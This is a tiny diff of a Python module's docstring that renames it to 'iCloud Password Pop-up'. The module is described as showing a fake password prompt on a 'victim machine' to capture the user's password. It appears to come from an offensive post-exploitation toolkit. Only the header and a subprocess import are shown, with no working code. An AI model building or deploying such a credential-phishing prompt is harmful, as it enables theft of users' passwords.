@@ -1,5 +1,5 @@
 '''
-NAME: Password Pop-up
+NAME: iCloud Password Pop-up
 DESCRIPTION: Creates a password pop-up on victim machine asking for use inputted password
 '''
 import subprocess
